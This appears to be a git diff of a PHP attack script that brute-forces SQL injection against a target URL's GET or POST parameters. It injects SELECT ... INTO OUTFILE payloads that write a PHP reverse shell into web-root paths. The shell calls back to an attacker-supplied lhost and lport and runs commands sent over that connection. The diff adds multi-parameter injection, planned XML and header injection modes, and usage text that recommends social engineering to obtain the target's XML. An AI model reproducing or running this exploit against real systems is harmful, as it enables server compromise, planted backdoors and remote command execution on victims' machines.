@@ -1,5 +1,7 @@
 <?php
-
+// xml innjection
+// german
+//getenv php
 echo"                ____  _   _ _____ _     _                            \n";
 echo"         __/\__/ ___|| | | | ____| |   | |                           \n";
 echo"         \    /\___ \| |_| |  _| | |   | |                           \n";
@@ -14,7 +16,6 @@ echo"           \_/_/   \_\_____|___|____/_/   \_\_| \___/|_| \_\ \/      \n";
 echo"                                                                     \n";
 echo"                                                                     \n";
 echo"                                                By: Unnknown AD -_-  \n";
-
 $lhost=readline("Shell Validator > lhost :");
 $lport=readline("Shell Validator > lport :");
 $wordlist=array("/var/www/html/shell_magnify.php","c:/wamp/www/shell_magnify.php");
@@ -29,10 +30,11 @@ if((!isset($argv[3])))
     if($http_file_interaction==0){
     echo "[*] usage :\n
 
-* default sql backdoor => mysql.php hostname/index method param (supperate the parameters with :: if you want more)\n
-* headers injection => mysql.php --headers-file <your file> \n
-* NOTE : use wireshark or burpsuite to gather received http headers (it must includes headers only) !!
-    ";
+$ default sql backdoor => mysql.php <url> <method> <param1::param2::>\n
+$ headers injection => mysql.php --headers-file <your file> \n
+$ xml tags injection => mysql.php <url> --xml-file <your xml source code file goes here>
+// NOTES : use wireshark or burpsuite to gather received http headers (it must includes headers only) !!
+          use social engineering to get the xml code (it counts on you)    ";
     exit;
 }}
     else{
@@ -46,7 +48,6 @@ if((!isset($argv[3])))
             $param=$argv[3];
             echo "[!] Start Bruteforcing... \n";
 }
-
            /// HEADERS INJECTION
 function fetch_parameters($method,$line,$default="null"){
 if ($method=="GET"){
@@ -124,7 +125,6 @@ function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
         $p=str_replace("\n","",$p);
         $p="\"$p\"";
       $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost'".",$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
-
       foreach($cmd as $command){
       $blank_="";
       $cookies_values="";
@@ -171,7 +171,8 @@ function get($param,$w){
         foreach($cmd as $command){
             $api=socket_create(AF_INET,SOCK_STREAM,0);
             socket_connect($api,$hostname,80) or die('unable to reach the target host');
-            $request="GET $index?$param=".urlencode($command)." HTTP/1.1\r\nHost: ".$hostname."\r\nConnection: Close\r\n\r\n";
+            $request="GET $index?".implode(urlencode($command)."&",$param)." HTTP/1.1\r\nHost: ".$hostname."\r\nConnection: Close\r\n\r\n";
+            //echo $request;
             socket_write($api,$request);
             socket_close($api);
             make_sure($hostname,$p);
@@ -182,38 +183,50 @@ function get($param,$w){
 function post($param,$w){
   global $index;
   global $cmd;
-  global $hostname,$method;
-
+  global $hostname,$method,$lhost,$lport;
    // the buffer size is depending on the file size (20258)
   foreach($w as $p){
-
-  $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
-  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
+  $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
+  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
       foreach($cmd as $command){
           $api=socket_create(AF_INET,SOCK_STREAM,0);
           socket_connect($api,$hostname,80) or die('unable to reach the target host');
-          $request="POST $index HTTP/1.1\r\nHost: $hostname\r\nContent-Length:320\r\nContent-Type:application/x-www-form-urlencoded\r\nConnection: Close\r\n\r\n$param=$command";
+          echo "bug";
+          $request="POST $index HTTP/1.1\r\nHost: $hostname\r\nContent-Length: ".strlen(implode($command."&",$param))."\r\nContent-Type:application/x-www-form-urlencoded"."\r\nConnection: Close\r\n\r\n".implode($command."&",$param);
+          echo $request;
+          echo $request;
           socket_write($api,$request);
+          //print_r(explode("&",str_replace(" ","",implode(urlencode($command)."&",$param))));
+        //  echo socket_read($api,1024);
           socket_close($api);
           make_sure($hostname,$p);
+
           }
     }
 }
 if ($argv[2]=='GET'){
   if (strpos($param,"::")){
-    foreach(explode("::",$param) as $pr){
+    /*foreach(explode("::",$param) as $pr){
       get($pr,$wordlist);
     };
-  }else{
-    get($param,$wordlist);
-}
+    */
+    $node=explode("::",$param);
+    foreach($node as $primarykey=>$noditem){
+      $node[$primarykey]=$noditem."=";
+    }
+    get($node,$wordlist);
+  }
 }else{
   if (strpos($param,"::")){
-    foreach(explode("::",$param) as $pr){
+    /*foreach(explode("::",$param) as $pr){
       echo "$pr\n";
       post($pr,$wordlist);
+    }*/
+    $node=explode("::",$param);
+    foreach($node as $primarykey=>$noditem){
+      $node[$primarykey]=$noditem."=";
     }
-  }else{
-    post($param,$wordlist);
+    print_r($node);
+    post($node,$wordlist);
   }}
 ?>
